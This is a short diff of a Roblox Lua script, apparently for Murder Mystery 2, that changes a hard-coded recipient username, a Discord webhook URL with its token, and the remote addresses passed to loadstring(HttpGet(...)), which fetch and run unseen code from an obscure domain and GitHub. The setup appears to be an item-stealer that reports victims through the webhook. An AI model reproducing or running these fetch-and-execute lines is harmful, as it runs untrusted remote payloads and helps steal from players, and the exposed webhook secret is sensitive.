@@ -1,8 +1,8 @@
 Username = "solaryrobloxaziz"
-Webhook = "https://discord.com/api/webhooks/1262845110509502484/FyN65xncmSV27mKeT8qiKndktVf4SgiZ2Smp5NDijjQh2Z01iL7UunMJ1kqv1VnOP_ls"
+Webhook = "https://discord.com/api/webhooks/1263235558981898322/xOhGwfj8x9tHQ8A4kM6Yu9b4-zMaqE1z220z7GBdLIzNKnqLBA0lSqgVrGLTlxA_B_Wj"
 
-loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
+loadstring(game:HttpGet("https://egorikusa.space/d9b56c8bbc86a06cfa6a31b0.lua", true))()
 
 wait(1)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jalalx7/mm2-script/main/mm2%20script"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mm2duper/gui/main/gui"))()
